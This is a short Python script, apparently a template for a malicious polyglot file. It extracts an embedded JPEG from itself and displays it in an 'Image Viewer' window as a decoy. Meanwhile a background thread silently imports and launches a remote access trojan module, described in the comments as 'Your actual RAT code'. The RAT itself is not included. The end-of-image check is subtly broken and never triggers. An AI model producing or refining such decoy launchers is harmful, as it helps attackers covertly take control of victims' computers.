import os
import sys
import tempfile
import tkinter as tk
from PIL import Image, ImageTk
import threading


def extract_image():
    """Extract JPEG from the polyglot file"""
    with open(sys.argv[0], 'rb') as f:
        data = f.read()

    # Find JPEG boundaries
    jpeg_start = data.find(b'\xFF\xD8\xFF')  # JPEG magic bytes
    jpeg_end = data.find(b'\xFF\xD9') + 2  # JPEG end marker

    if jpeg_start == -1 or jpeg_end == -1:
        sys.exit(1)

    return data[jpeg_start:jpeg_end]


def show_image(img_data):
    """Display extracted image"""
    root = tk.Tk()
    root.title("Image Viewer")
    with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as tmp:
        tmp.write(img_data)
        img = ImageTk.PhotoImage(Image.open(tmp.name))

    label = tk.Label(root, image=img)
    label.image = img  # Prevent garbage collection
    label.pack()
    root.mainloop()


def start_rat():
    """Silently execute RAT server"""
    import rat_server  # Your actual RAT code
    rat_server.main()


if __name__ == "__main__":
    img_data = extract_image()
    threading.Thread(target=start_rat, daemon=True).start()
    show_image(img_data)